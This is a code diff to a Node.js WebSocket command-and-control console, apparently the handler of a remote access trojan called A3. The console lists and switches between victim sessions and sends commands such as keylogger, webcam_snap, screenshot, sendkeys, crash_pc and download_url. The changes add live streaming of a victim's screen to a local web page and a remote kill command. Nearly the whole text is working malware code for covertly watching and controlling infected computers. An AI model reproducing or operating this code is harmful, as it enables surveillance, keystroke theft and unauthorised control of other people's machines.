@@ -1,7 +1,10 @@
 const WebSocket = require('ws');
 const colors = require('colors');
 var mkdirp = require('mkdirp');
-
+var localAddress = 0;
+require('dns').lookup(require('os').hostname(), function (err, add, fam) {
+   localAddress = add;
+});
 require('events').EventEmitter.setMaxListeners = 1;
 var menu = true;
 var WebsocketErrorCodes = {
@@ -56,6 +59,10 @@ wss.on('connection', function connection(ws, req) {
 	sessions[lastSession].clientAddress = ws._socket.remoteAddress.replace("::ffff:", "");
 	sessions[lastSession].sessionId = lastSession;
 	sessions[lastSession].infos = getUrlParams(req.url).infos;
+	sessions[lastSession].close = 0;
+	sessions[lastSession].alreadyStreamed = false;
+	sessions[lastSession].isStreaming = false;
+	sessionsUpdate();
 	if(menu){
 		console.log("\n[".bold + "+".green + "] Connected to client : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
 		menu = false;
@@ -63,7 +70,8 @@ wss.on('connection', function connection(ws, req) {
 		console.log("[".bold + "+".green + "] Session ID : ".bold + currentSession);
 		lastWorkingDir = "";
 	}else{
-		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + ", client backgrounded as ID : ".bold + lastSession + " !".bold);
+		console.log("\n[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + ", client backgrounded as ID : ".bold + lastSession + " !".bold);
+		rl.prompt();
 	}
 
 	ws.on('message', function incoming(message) {
@@ -104,6 +112,11 @@ wss.on('connection', function connection(ws, req) {
 				mkdirp('clients/' + sessions[currentSession].clientAddress + "/screenshots/", function(err) { 
 					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/screenshots/" + (new Date()).getUTCDate() + "-" + parseInt(parseInt((new Date()).getUTCMonth()) + 1) + "-" + (new Date()).getUTCFullYear() + ".png", base64Data, 'base64', function (err) {});
 				});
+			}else if (message.startsWith("##STREAMSHOT##")) {
+				var base64Data = message.replace("##STREAMSHOT##", "").replace(/^data:image\/png;base64,/, "");
+				mkdirp("/var/www/html", function(err) { 
+					require("fs").writeFile("/var/www/html/screen.png", base64Data, 'base64', function (err) {});
+				});
 			}else if (message.startsWith("##SPEEDTEST##")) {
 				console.log("[".bold + "i".yellow + "] Victim's internet speed is ".bold + JSON.parse(message.replace("##SPEEDTEST##","")).speed.bold + "Mo/s !".bold);
 			}else if (message.startsWith("##WEBCAM_SNAP##")) {
@@ -127,28 +140,20 @@ wss.on('connection', function connection(ws, req) {
 			}
 		}else{
 			if(WebsocketErrorCodes.hasOwnProperty(reasonCode)){
-				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
+				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + getUrlParams(req.url).id + " closed. Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
 			}else{
-				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Unkown error code !".bold);
+				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + getUrlParams(req.url).id + " closed. Unkown error code !".bold);
 			}
 			menu = true;
 		}
 
 		delete sessions[getUrlParams(req.url).id];
+		sessionsUpdate();
 		rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
 		rl.prompt();
 	});
 
 });
-
-function findSessionNumber(SS, SE){
-	for(obj in SE){
-		if(SE[obj].clientAddress == SS._socket.remoteAddress.replace("::ffff:", "")){
-			return obj;
-			break;
-		}
-	}
-}
 
 function getUrlParams(search) {
     let hashes = search.slice(search.indexOf('?') + 1).split('&')
@@ -161,31 +166,111 @@ function getUrlParams(search) {
     return params
 }
 
-function makeId() {
-  var text = "";
-  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-
-  for (var i = 0; i < 10; i++)
-    text += possible.charAt(Math.floor(Math.random() * possible.length));
-
-  return text;
-}
-
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions play background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions stream_start stream_stop close_connection play background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
 
 rl.on('line', (line) => {
 	var msg = line.trim();
+
+	if(msg.startsWith("sessions")){
+		if(msg.split(" ").length == 2 && msg.split(" ")[1] == "list"){
+			if(Object.keys(sessions).length > 0){
+				console.log("\nLISTING SESSIONS : ".bold.green);
+				sessionsUpdate();
+				for(s in sessions){
+					try{
+					var loggingId = sessions[s].sessionId || "No UID, old A3".bold.red;
+					var loggingInfos = sessions[s].infos || "No V, old A3".bold.red;
+					if(loggingId == sessions[s].sessionId){
+						loggingId = loggingId.bold.cyan;
+					}
+					if(loggingInfos == sessions[s].infos){
+						loggingInfos = loggingInfos.bold.cyan;
+					}
+					console.log("ID : ".bold + String(sessions[s].number).bold.green + " UID : ".bold + loggingId + " IP : ".bold + sessions[s].clientAddress.bold.cyan + " V : ".bold + loggingInfos);
+					}catch(e){console.log(e);}
+				}
+			}else{
+				console.log("[".white + "-".red + "]".white + " No sessions !".red);
+			}
+		}else if(msg.split(" ").length == 3 && msg.split(" ")[1] == "connect"){
+			if(getId(msg.split(" ")[2]) != 0){
+				sessionsUpdate();
+				var nb = msg.split(" ")[2];
+				currentSession = getId(nb).sessionId;
+				menu = false;
+				lastWorkingDir = "";
+				console.log("[".bold + "+".blue + "] Switched !".bold);
+				sessions[currentSession].send("SENDHELLO");
+			}else{
+				console.log("[".white + "-".red + "]".white + " Session ".red + msg.split(" ")[2].underline + " does not exist !".red);
+			}
+		}else{
+			console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "sessions connect <ID>\n                              sessions list");
+		}
+		rl.prompt();
+	}else{
 	if(!menu){
-		if (msg == "screenshot") {
-			console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
-			sessions[currentSession].send(msg);
+		if (msg.startsWith("screenshot")) {
+			if(msg.split(" ").length == 1){
+				console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
+				sessions[currentSession].send(msg);
+			}else if(msg.split(" ").length == 3){
+				if(!isNaN(msg.split(" ")[1]) && !isNaN(msg.split(" ")[2])){
+					console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
+					sessions[currentSession].send(msg);
+				}else{
+					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " x and y must be integers !".bold);
+				}
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "screenshot <x> <y>");
+				rl.prompt();
+			}
+		} else if(msg == "stream_stop"){
+		
+			if(sessions[currentSession].isStreaming){
+				sessions[currentSession].send(msg);
+				sessions[currentSession].isStreaming = false;
+				require("fs").unlink('/var/www/html/' + currentSession + '.html', (err) => {});
+				require("fs").unlink('/var/www/html/screen.png', (err) => {});
+			}
+
+		}else if (msg.startsWith("stream_start")) {
+			if(!sessions[currentSession].isStreaming){
+				sessions[currentSession].isStreaming = true;
+				if(msg.split(" ").length == 3){
+					var x = msg.split(" ")[1];
+					var y = msg.split(" ")[2];
+				}else{
+					var x = 480;
+					var y = 360;
+				}
+				if(!sessions[currentSession].alreadyStreamed){
+					var streamId = currentSession;
+					var url = "http://" + localAddress + "/" + streamId + ".html";
+					console.log("[".bold + "+".blue + "] Let's go : ".bold + url.underline + " Use stream_stop to finish streaming !".bold);
+					createHTML(streamId);
+					sessions[currentSession].alreadyStreamed = true;
+				}
+				sessions[currentSession].send("STREAM " + x + " " + y);
+				rl.prompt();
+			}
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
+		} else if (msg == "close_connection") {
+			console.log("[".bold + "+".blue + "] Re-type the command if you are sure you want to kill the distant programm. If you do, it will not be reachable until reboot !".bold);
+			sessions[currentSession].close++;
+			if(sessions[currentSession].close == 2){
+				sessions[currentSession].send("CLOSE");
+				sessions[currentSession].close = 0;
+				sessions[currentSession].terminate();
+			}else{
+				rl.prompt();
+			}
 		} else if (msg.startsWith("play")) {
 			if(msg.split(" ").length == 2){
 				console.log("[".bold + "+".blue + "] Request sent...".bold);
@@ -202,13 +287,13 @@ rl.on('line', (line) => {
 			}else{
 				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "sendkeys <keys>");
 				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "sendkeys {F4}");
-					console.log("              sendkeys {A}");10555
-					console.log("              sendkeys ABC");
-					console.log("              sendkeys {F1}ABC{ENTER}");
-					console.log("              sendkeys ^{C}");
-					console.log("              ^ = ctrl");
-					console.log("              % = alt");
-					console.log("              + = shift");
+				console.log("              sendkeys {A}");
+				console.log("              sendkeys ABC");
+				console.log("              sendkeys {F1}ABC{ENTER}");
+				console.log("              sendkeys ^{C}");
+				console.log("              ^ = ctrl");
+				console.log("              % = alt");
+				console.log("              + = shift");
 				rl.prompt();
 			}
 		} else if (msg.startsWith("ppal")) {
@@ -335,32 +420,7 @@ rl.on('line', (line) => {
 			sessions[currentSession].send(msg);
 		}
 	}else{
-		if(msg.startsWith("sessions")){
-			if(msg.split(" ").length == 2 && msg.split(" ")[1] == "list"){
-				if(Object.keys(sessions).length > 0){
-					var c = 0;
-					console.log("LISTING SESSIONS : ");
-					for(s in sessions){
-						console.log(c + " ID : ".bold + sessions[s].sessionId.bold.cyan + " IP : ".bold + sessions[s].clientAddress.bold.cyan + " V : ".bold + sessions[s].infos.bold.blue);
-						c++;
-					}
-				}else{
-					console.log("[".white + "-".red + "]".white + " No sessions !".red);
-				}
-			}else if(msg.split(" ").length == 3 && msg.split(" ")[1] == "connect"){
-				if(sessions.hasOwnProperty(msg.split(" ")[2])){
-					currentSession = msg.split(" ")[2];
-					menu = false;
-					lastWorkingDir = "";
-					sessions[currentSession].send("SENDHELLO");
-				}else{
-					console.log("[".white + "-".red + "]".white + " Session ".red + msg.split(" ")[2].underline + " does not exist !".red);
-				}
-			}else{
-				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "sessions connect <ID>\n                              sessions list");
-			}
-			rl.prompt();
-		}else if(msg == "help"){
+		if(msg == "help"){
 			console.log(cmdListHandler.join("\n"));
 			rl.prompt();
 		}else if(msg == "exit"){
@@ -371,12 +431,50 @@ rl.on('line', (line) => {
 			rl.prompt();
 		}
 	}
+	}
 }).on('close', () => {
 	console.log("");
 	console.log("[".bold + "I".magenta + "] Next time, if you want to leave the console, type \"exit\".".bold);
 	process.exit(0);
 });
 
+function createHTML(streamId){
+	var html = '<html><head><script type="text/javascript">function go(){setInterval(function(){document.getElementById("img").src = "screen.png?" + Math.floor(Math.random() * 10000);}, 1000);}</script><h1>Stream</h1></head><body onLoad="go()"><img id="img" src="screen.png"></img>';
+	mkdirp('/var/www/html/', function(err) {
+		require("fs").writeFile('/var/www/html/' + streamId + ".html", html, 'UTF-8', function (err) {});
+	});
+}
+
+function makeId(n) {
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+  for (var i = 0; i < n; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+
+function getId(cc){
+	var r = 0;
+	for(s in sessions){	
+		if(sessions[s].number == cc){
+			r = sessions[s];
+		}
+	}
+	if(r == 0){
+		return 0;
+	}else{	return r;
+}
+}
+
+function sessionsUpdate(){
+	var nn = 0;
+	for(s in sessions){	
+		sessions[s].number = nn;
+		nn++;
+	}
+}
 function ValidURL(str) {
 	if(str.indexOf('http') > -1) {
 	  return true;
